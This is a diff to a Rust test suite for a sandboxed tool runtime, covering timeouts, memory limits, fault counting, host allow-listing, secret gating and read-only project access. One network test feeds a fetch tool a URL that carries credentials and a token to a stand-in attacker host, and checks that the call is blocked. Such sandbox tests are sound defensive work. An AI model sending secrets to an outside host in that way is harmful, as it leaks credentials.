@@ -44,6 +44,7 @@ async fn a_tools_component_lists_its_tools_and_answers_a_call() {
             "echo",
             &json!({"text": "hello"}),
             "call-1",
+            None,
             Some(progress.clone()),
             &none(),
         )
@@ -83,7 +84,7 @@ async fn a_tool_that_never_returns_is_stopped_at_its_timeout() {
     let started = Instant::now();
     let err = rig
         .vm
-        .call_tool("slow", &json!({}), "c", None, &none())
+        .call_tool("slow", &json!({}), "c", None, None, &none())
         .await
         .unwrap_err();
     assert_eq!(err, CallFailure::TimedOut);
@@ -95,7 +96,7 @@ async fn a_tool_that_never_returns_is_stopped_at_its_timeout() {
 
     let out = rig
         .vm
-        .call_tool("echo", &json!({"text": "after"}), "c", None, &none())
+        .call_tool("echo", &json!({"text": "after"}), "c", None, None, &none())
         .await
         .unwrap();
     assert_eq!(out.content, "after");
@@ -118,7 +119,7 @@ async fn a_cancelled_tool_call_ends_promptly_and_is_not_held_against_it() {
     let started = Instant::now();
     let err = rig
         .vm
-        .call_tool("slow", &json!({}), "c", None, &cancel)
+        .call_tool("slow", &json!({}), "c", None, None, &cancel)
         .await
         .unwrap_err();
     assert_eq!(err, CallFailure::Cancelled);
@@ -131,7 +132,7 @@ async fn a_tool_that_allocates_past_the_memory_limit_fails_and_frees_it() {
     let rig = rig("tools-probe", Capabilities::default(), limits(5_000)).await;
     let err = rig
         .vm
-        .call_tool("hog", &json!({"mb": "64"}), "c", None, &none())
+        .call_tool("hog", &json!({"mb": "64"}), "c", None, None, &none())
         .await
         .unwrap_err();
     match &err {
@@ -141,7 +142,7 @@ async fn a_tool_that_allocates_past_the_memory_limit_fails_and_frees_it() {
     // Within the limit is fine, and the failed call's memory came back.
     let out = rig
         .vm
-        .call_tool("hog", &json!({"mb": "8"}), "c", None, &none())
+        .call_tool("hog", &json!({"mb": "8"}), "c", None, None, &none())
         .await
         .unwrap();
     assert!(out.content.starts_with("held"), "{}", out.content);
@@ -161,7 +162,14 @@ async fn concurrent_tool_calls_share_the_applications_memory() {
     let probe = rig("tools-probe", Capabilities::default(), limits(300)).await;
     probe
         .vm
-        .call_tool("slow", &json!({}), "m", None, &CancellationToken::new())
+        .call_tool(
+            "slow",
+            &json!({}),
+            "m",
+            None,
+            None,
+            &CancellationToken::new(),
+        )
         .await
         .ok();
     let one = probe.vm.health().memory_peak_bytes;
@@ -176,15 +184,17 @@ async fn concurrent_tool_calls_share_the_applications_memory() {
     .await;
     // A tool that never returns holds its instance's memory until it times out.
     let slow = rig.vm.clone();
-    let holder =
-        tokio::spawn(async move { slow.call_tool("slow", &json!({}), "a", None, &none()).await });
+    let holder = tokio::spawn(async move {
+        slow.call_tool("slow", &json!({}), "a", None, None, &none())
+            .await
+    });
     eventually(Duration::from_secs(2), "the slow call to start", || {
         rig.vm.health().memory_bytes > 0
     })
     .await;
     let err = rig
         .vm
-        .call_tool("echo", &json!({"text": "x"}), "b", None, &none())
+        .call_tool("echo", &json!({"text": "x"}), "b", None, None, &none())
         .await
         .unwrap_err();
     assert!(
@@ -194,7 +204,7 @@ async fn concurrent_tool_calls_share_the_applications_memory() {
     assert_eq!(holder.await.unwrap().unwrap_err(), CallFailure::TimedOut);
     assert_eq!(rig.vm.health().consecutive_faults, 0);
     rig.vm
-        .call_tool("echo", &json!({"text": "x"}), "c", None, &none())
+        .call_tool("echo", &json!({"text": "x"}), "c", None, None, &none())
         .await
         .unwrap();
 }
@@ -214,6 +224,7 @@ async fn the_network_is_reached_only_for_a_declared_host() {
             &json!({"url": "https://api.example.com/v1"}),
             "c",
             None,
+            None,
             &none(),
         )
         .await
@@ -230,6 +241,7 @@ async fn the_network_is_reached_only_for_a_declared_host() {
             "fetch",
             &json!({"url": "https://user:s3cret@evil.example/path?token=t0ken"}),
             "c",
+            None,
             None,
             &none(),
         )
@@ -273,6 +285,7 @@ async fn only_a_declared_environment_variable_is_readable() {
                 &json!({"secret": key, "url": "x"}),
                 "c",
                 None,
+                None,
                 &none(),
             )
             .await
@@ -284,7 +297,7 @@ async fn only_a_declared_environment_variable_is_readable() {
 #[tokio::test(flavor = "multi_thread")]
 async fn files_are_reachable_only_inside_a_preopened_directory() {
     let rig = rig_with("tools-probe", |dir| {
-        let mut s = spec(
+        let s = spec(
             Capabilities {
                 fs: vec![FsGrant {
                     path: "${data}/notes".into(),
@@ -298,14 +311,13 @@ async fn files_are_reachable_only_inside_a_preopened_directory() {
         std::fs::create_dir_all(dir.join("data/notes")).unwrap();
         std::fs::write(dir.join("data/notes/a.txt"), "inside").unwrap();
         std::fs::write(dir.join("data/outside.txt"), "outside").unwrap();
-        s.dirs.project = None;
         s
     })
     .await;
     let call = |tool: &'static str, input: serde_json::Value| {
         let vm = rig.vm.clone();
         async move {
-            vm.call_tool(tool, &input, "c", None, &CancellationToken::new())
+            vm.call_tool(tool, &input, "c", None, None, &CancellationToken::new())
                 .await
                 .unwrap()
         }
@@ -346,7 +358,7 @@ async fn a_tool_may_not_arm_a_timer() {
     let rig = rig("tools-probe", Capabilities::default(), limits(5_000)).await;
     let out = rig
         .vm
-        .call_tool("timer", &json!({}), "c", None, &none())
+        .call_tool("timer", &json!({}), "c", None, None, &none())
         .await
         .unwrap();
     assert!(
@@ -362,12 +374,12 @@ async fn consecutive_faults_disable_the_application() {
     // An answer in between resets the streak.
     for _ in 0..FAULT_LIMIT - 1 {
         rig.vm
-            .call_tool("explode", &json!({}), "c", None, &none())
+            .call_tool("explode", &json!({}), "c", None, None, &none())
             .await
             .unwrap_err();
     }
     rig.vm
-        .call_tool("echo", &json!({"text": "ok"}), "c", None, &none())
+        .call_tool("echo", &json!({"text": "ok"}), "c", None, None, &none())
         .await
         .unwrap();
     assert_eq!(rig.vm.health().consecutive_faults, 0);
@@ -375,7 +387,7 @@ async fn consecutive_faults_disable_the_application() {
     for _ in 0..FAULT_LIMIT {
         let err = rig
             .vm
-            .call_tool("explode", &json!({}), "c", None, &none())
+            .call_tool("explode", &json!({}), "c", None, None, &none())
             .await
             .unwrap_err();
         assert!(matches!(err, CallFailure::Faulted(_)), "{err:?}");
@@ -389,7 +401,7 @@ async fn consecutive_faults_disable_the_application() {
 
     let err = rig
         .vm
-        .call_tool("echo", &json!({"text": "ok"}), "c", None, &none())
+        .call_tool("echo", &json!({"text": "ok"}), "c", None, None, &none())
         .await
         .unwrap_err();
     assert!(
@@ -420,5 +432,74 @@ async fn an_event_hook_blocks_a_named_tool_and_lets_the_rest_through() {
     );
     assert!(
         matches!(decide("note", json!({"n": 1})).await, HookDecision::AddContext(t) if t.contains("\"n\":1"))
+    );
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_tool_reads_the_configuration_and_its_callers_project_read_only() {
+    let rig = rig(
+        "tools-probe",
+        Capabilities {
+            fs: vec![FsGrant {
+                path: "${project}".into(),
+                writable: false,
+            }],
+            ..Default::default()
+        },
+        limits(5_000),
+    )
+    .await;
+    let out = rig
+        .vm
+        .call_tool("config", &json!({}), "c", None, None, &none())
+        .await
+        .unwrap();
+    assert_eq!(
+        serde_json::from_str::<serde_json::Value>(&out.content).unwrap(),
+        json!({"greeting": "hi"})
+    );
+
+    let (a, b) = (rig.dir.path().join("a"), rig.dir.path().join("b"));
+    for (dir, text) in [(&a, "project a"), (&b, "project b")] {
+        std::fs::create_dir_all(dir).unwrap();
+        std::fs::write(dir.join("README.md"), text).unwrap();
+    }
+    let read =
+        |project: Option<std::path::PathBuf>, tool: &'static str, input: serde_json::Value| {
+            let vm = rig.vm.clone();
+            async move {
+                vm.call_tool(tool, &input, "c", project.as_deref(), None, &none())
+                    .await
+                    .unwrap()
+            }
+        };
+    // Each call sees the project of whoever made it.
+    let out = read(
+        Some(a.clone()),
+        "read-file",
+        json!({"path": "/project/README.md"}),
+    )
+    .await;
+    assert_eq!((out.content.as_str(), out.is_error), ("project a", false));
+    let out = read(
+        Some(b.clone()),
+        "read-file",
+        json!({"path": "/project/README.md"}),
+    )
+    .await;
+    assert_eq!(out.content, "project b");
+    // No project, no `/project`; and never writable.
+    let out = read(None, "read-file", json!({"path": "/project/README.md"})).await;
+    assert!(out.is_error, "{}", out.content);
+    let out = read(
+        Some(a.clone()),
+        "write-file",
+        json!({"path": "/project/README.md", "text": "changed"}),
+    )
+    .await;
+    assert!(out.is_error, "the project was writable: {}", out.content);
+    assert_eq!(
+        std::fs::read_to_string(a.join("README.md")).unwrap(),
+        "project a"
     );
 }
